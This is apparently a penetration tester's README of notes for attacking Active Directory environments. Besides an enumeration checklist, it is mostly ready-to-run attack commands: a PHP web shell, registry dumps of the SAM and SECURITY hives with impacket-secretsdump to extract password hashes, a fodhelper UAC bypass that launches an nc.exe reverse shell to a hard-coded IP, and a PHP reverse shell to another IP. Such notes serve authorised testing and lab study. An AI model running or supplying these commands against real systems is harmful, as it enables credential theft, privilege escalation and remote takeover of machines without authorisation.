# Active Directory Abuse
A collection of notes for exploiting and abusing Active Directory environments.

## What have you got?
- [Nothing](steps/no-credentials.md)
- [Username](steps/got-username.md)
- [Credentials](steps/got-credentials.md)
- [Hashes](steps/cracking-hashes.md)
- [Administrator](steps/got-administrator.md)

### Quick Brain Dump
- Try RPC null authentication (`enumdomusers`, `querydispfinfo`)
- List SMB shares
- LDAP password attributes (`ldapsearch`)
- GetUserSPNs
- GetNPUsers
- Check SMB after finding credentials (`crackmapexec`)
- Bloodhound = Lord and Saviour
- Check Program Files
- Check Services using PowerUp.ps1

### Other Quick Commands
```php
<?php system($_GET['cmd']); ?>
```

```powershell
reg.exe save hklm\sam c:\temp\sam.save
reg.exe save hklm\security c:\temp\security.save
reg.exe save hklm\system c:\temp\system.save
```

```bash
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL -outputfile hashes/hashes
```

PowerView enumeration for interesting rights on domain object

```powershell
Import-Module PowerView.ps1
Invoke-ACLScanner
```

UAC Bypass

```text
BUILTIN\Administrators
Mandatory Label\Medium Mandatory Level
```

```powershell
%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell.exe -ep bypass

REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command  
REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /v
DelegateExecute /t
REG_SZ REG ADD HKCU\Software\Classes\ms-settings\Shell\Open\command /d "C:\Users\someone\Desktop\nc.exe 192.168.119.149 9001 -e cmd.exe" /f

fodhelper.exe
```

PHP Shell

```php
<?php $sock=fsockopen("10.10.16.2",9002);$proc=proc_open("bash", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes); ?>
```